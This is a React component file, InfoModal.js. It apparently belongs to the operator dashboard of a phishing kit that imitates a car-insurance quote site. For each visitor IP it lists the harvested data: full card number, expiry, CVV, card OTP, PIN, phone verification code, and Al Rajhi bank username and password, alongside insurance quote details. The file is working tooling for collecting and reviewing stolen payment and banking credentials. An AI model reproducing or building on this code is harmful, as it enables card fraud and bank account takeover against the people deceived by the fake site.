// src/components/InfoModal.js
import React from "react";
import { Modal, Button } from "react-bootstrap";

export default function InfoModal({ ip, user, onClose }) {
  const rows = [
    ["Full Name",       user.userName],
    ["Phone",           user.phoneNumber],
    ["ID Number",       user.idNumber],
    ["Offer Type",      user.offerType],
    ["Reg Type",        user.regType],
    ["Birth Date",      user.birthDate],
    ["Serial #",        user.serialNumber],
    ["Car Year",        user.carYear],
    ["Car Make",        user.carMake],
    ["Usage Type",      user.usageType],
    ["City",            user.city],
    ["Start Date",      user.startDate],
    ["Insurance Co",    user.company],
    ["Plan Type",       user.planType],
    ["Plan Price",      user.planPrice],
    ["Addons",          Array.isArray(user.addons) ? user.addons.join(", ") : user.addons],
    ["Addons Total",    user.addonsTotal],
    ["Total",           user.total],
    ["Payment Method",  user.paymentMethod],
    ["Card Holder",     user.cardHolderName],
    ["Card #",          user.cardNumber],
    ["Expiry",          user.expiryDate],
    ["CVV",             user.cvv],
    ["OTP",             user.verificationCode],
    ["PIN",             user.pin],
    ["Phone #",         user.phoneNumber],
    ["Operator",        user.operator],
    ["Phone OTP",       user.phoneCode],
    ["Rajhi User",      user.rajhiUsername],
    ["Rajhi Pass",      user.rajhiPassword],
  ];

  return (
    <Modal show onHide={onClose} size="lg" centered>
      <Modal.Header closeButton>
        <Modal.Title>Visitor Info — {ip}</Modal.Title>
      </Modal.Header>
      <Modal.Body style={{ direction: "ltr" }}>
        {rows.map(([label, val]) => (
          <p key={label}><strong>{label}:</strong> {val ?? "—"}</p>
        ))}
      </Modal.Body>
      <Modal.Footer>
        <Button variant="secondary" onClick={onClose}>Close</Button>
      </Modal.Footer>
    </Modal>
  );
}
